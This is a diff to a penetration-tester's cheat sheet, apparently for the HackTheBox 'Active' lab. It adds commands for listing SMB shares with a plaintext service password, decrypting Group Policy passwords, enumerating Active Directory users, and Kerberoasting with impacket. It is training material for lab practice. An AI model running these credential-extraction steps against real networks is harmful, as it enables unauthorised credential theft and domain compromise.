@@ -21,9 +21,14 @@ smbmap -u USER -p PASSWORD -d DOMAIN -H ip
 smbmap -R dirname -H ip
 # download file with certain name
 smbmap -R dirname -H ip -A Groups.xml
+# list shares with creds
+smbmap -d active.htb -u svc_tgs -p GPPstillStandingStrong2k18 -H 10.10.10.100
 # decrypt gpp password, cpassword comes from group xml
 gpp-decrypt "cpassword"
-
+# Get AD users after having user creds
+GetADUsers.py -all -dc-ip 10.10.10.100 active.htb/svc_tgs  # unicode errors see https://github.com/SecureAuthCorp/impacket/issues/632
+# Get user spn # https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names !!! FIX TIME SKEW
+GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs
 smbclient -L //10.10.10.100   (enter if password is requested)
 
 SHELLS
@@ -57,4 +62,5 @@ impacket --> https://github.com/SecureAuthCorp/impacket.git
 APT
 gobuster
 mdbtools
+seclists
 
